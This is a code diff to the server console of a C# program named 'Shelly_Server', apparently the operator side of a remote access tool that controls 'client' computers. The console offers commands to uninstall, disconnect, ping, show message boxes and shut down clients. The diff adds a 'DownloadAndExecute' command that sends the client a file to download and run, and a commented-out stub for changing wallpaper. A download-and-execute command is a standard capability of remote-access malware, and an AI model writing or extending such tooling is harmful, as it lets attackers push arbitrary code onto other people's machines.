@@ -22,7 +22,11 @@ namespace Shelly_Server
                         "1. Uninstall - Uninstalls Shelly from the client computer\n" +
                         "2. Disconnect - Shuts down the shell until next system startup\n" +
                         "3. Ping - Pings the client and shows the response\n" + 
-                        "4. MessageBox - Shows a messagebox on the clients computer\n\n" +
+                        "4. MessageBox - Shows a messagebox on the clients computer\n" +
+                        "5. DownloadAndExecute - Downloads and executes a file\n\n" +
+
+                        //"FUN\n" +
+                        //"1. Change wallpaper\n\n" +
 
                         "POWER OPTIONS\n" +
 
@@ -78,7 +82,7 @@ namespace Shelly_Server
                 // Show messagebox
                 case "messagebox":
 
-                    // Get messagebox body user input
+                    // Get user input
                     string Msg = Functions.UserInput.GetMessageBoxInput();
 
                     // Send message
@@ -86,6 +90,19 @@ namespace Shelly_Server
 
                     // Send message
                     SocketHandler.Send(Msg);
+                    break;
+
+                case "downloadandexecute":
+
+                    // Get user input
+                    string DNE = Functions.UserInput.GetDNEInput();
+
+                    // Send message
+                    SocketHandler.Send("downloadandexecute");
+
+                    // Send message
+                    SocketHandler.Send(DNE);
+
                     break;
 
                 // Shutdown client computer
